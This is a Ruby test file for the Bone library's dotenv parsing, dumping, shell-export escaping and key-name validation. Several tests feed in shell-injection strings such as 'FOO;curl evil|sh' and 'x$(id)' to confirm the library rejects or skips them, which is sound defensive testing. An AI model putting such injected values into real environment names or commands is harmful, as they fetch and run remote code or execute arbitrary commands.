# try/30_env_layer_try.rb

require 'bone'

## Parses simple KEY=value lines
Bone::Env.parse("A=1\nB=two\n")
#=> {'A' => '1', 'B' => 'two'}

## Ignores blanks and comments
Bone::Env.parse("# comment\n\nA=1\n")
#=> {'A' => '1'}

## Strips an optional leading export
Bone::Env.parse('export TOKEN=abc')
#=> {'TOKEN' => 'abc'}

## Honours single quotes literally
Bone::Env.parse("A='he said \"hi\"'")
#=> {'A' => 'he said "hi"'}

## Honours double-quote escapes
Bone::Env.parse('A="line1\nline2"')
#=> {'A' => "line1\nline2"}

## dump renders sorted dotenv lines
Bone::Env.dump({ 'B' => '2', 'A' => '1' })
#=> "A=1\nB=2\n"

## dump quotes values with spaces
Bone::Env.dump({ 'A' => 'hello world' })
#=> "A=\"hello world\"\n"

## export renders shell lines
Bone::Env.export({ 'A' => '1' })
#=> "export A='1'\n"

## export escapes single quotes
Bone::Env.export({ 'A' => "it's" })
#=> "export A='it'\\''s'\n"

## Round-trips through parse(dump(...))
Bone::Env.parse(Bone::Env.dump({ 'A' => 'hello world', 'B' => 'x' }))
#=> {'A' => 'hello world', 'B' => 'x'}

## Client import loads variables from dotenv text
Bone::Backends::Memory.reset!
Bone.source = 'memory://localhost'
@token, @secret = *Bone.generate
Bone.credentials = "#{@token}:#{@secret}"
Bone.import("DB_HOST=localhost\nDB_PORT=5432\n").sort
#=> ['DB_HOST', 'DB_PORT']

## env returns the stored hash
Bone.env
#=> {'DB_HOST' => 'localhost', 'DB_PORT' => '5432'}

## export reflects stored variables
Bone.export
#=> "export DB_HOST='localhost'\nexport DB_PORT='5432'\n"

## load_env! populates ENV
Bone.load_env!
ENV.fetch('DB_HOST', nil)
#=> 'localhost'

# -- F1/F2: name validation + emit-time backstop --------------------------

## valid_name? accepts shell/env identifiers
%w[FOO _x A1 DB_URL].map { |n| Bone::Env.valid_name?(n) }
#=> [true, true, true, true]

## valid_name? rejects blanks, non-identifiers, and injection attempts
['', '1abc', 'a-b', 'a b', 'a;b', 'a$b', 'a.b', 'FOO;curl evil|sh'].map { |n| Bone::Env.valid_name?(n) }
#=> [false, false, false, false, false, false, false, false]

## export refuses to emit a shell-injecting key name
begin
  Bone::Env.export({ 'x$(id)' => 'v' })
  false
rescue Bone::InvalidName
  true
end
#=> true

## dump refuses to emit a shell-injecting key name
begin
  Bone::Env.dump({ 'x$(id)' => 'v' })
  false
rescue Bone::InvalidName
  true
end
#=> true

## parse silently skips a malformed name line (import-from-string is safe)
Bone::Env.parse("FOO;curl evil|sh=payload\nOK=1\n")
#=> {'OK' => '1'}

# -- F7: dotenv_quote escaping via Env.dump -------------------------------

## dump double-quotes and escapes an embedded double quote
Bone::Env.dump({ 'A' => 'a"b' })
#=> 'A="a' + '\\' + '"b"' + "\n"

## dump escapes a newline as backslash-n inside double quotes
Bone::Env.dump({ 'A' => "a\nb" })
#=> 'A="a' + '\\n' + 'b"' + "\n"

## dump escapes a tab as backslash-t inside double quotes
Bone::Env.dump({ 'A' => "a\tb" })
#=> 'A="a' + '\\t' + 'b"' + "\n"

## dump escapes a backslash by doubling it
Bone::Env.dump({ 'A' => 'a\\b' })
#=> 'A="a' + '\\\\' + 'b"' + "\n"

## dump double-quotes an empty-string value
Bone::Env.dump({ 'A' => '' })
#=> 'A=""' + "\n"

## parse(dump(x)) round-trips values mixing quotes, escapes, and empties
@mixed = { 'A' => 'a"b', 'B' => "c\nd", 'C' => "e\tf", 'D' => 'g\\h', 'E' => '' }
Bone::Env.parse(Bone::Env.dump(@mixed)) == @mixed
#=> true
